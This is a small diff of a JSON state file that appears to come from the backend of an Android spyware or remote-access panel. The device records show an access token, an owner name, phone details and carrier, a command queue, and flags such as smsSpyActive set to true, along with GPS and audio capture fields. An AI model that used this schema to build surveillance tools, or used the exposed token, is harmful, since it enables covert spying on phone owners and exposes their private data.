@@ -27,14 +27,14 @@
     "deviceName": "TECNO MOBILE LIMITED TECNO LE7",
     "ownerUsername": "Zal Яyuichi",
     "token": "74e1975b32bc12b46b3359426f25ee25",
-    "lastSeen": 1779083029353,
+    "lastSeen": 1779091524660,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-16T09:09:20.775Z",
     "deviceInfo": {
       "model": "TECNO MOBILE LIMITED TECNO LE7",
       "androidVersion": "Android 11",
-      "battery": 99,
+      "battery": 79,
       "network": "WiFi: <unknown ssid>",
       "sim1": "Indosat Ooredoo",
       "sim2": "Tidak ada"
@@ -49,8 +49,7 @@
     },
     "smsSpyActive": true,
     "lastGps": null,
-    "lastAudio": null,
-    "pendingVideo": null
+    "lastAudio": null
   },
   {
     "deviceId": "f7f741128b03a5d1",
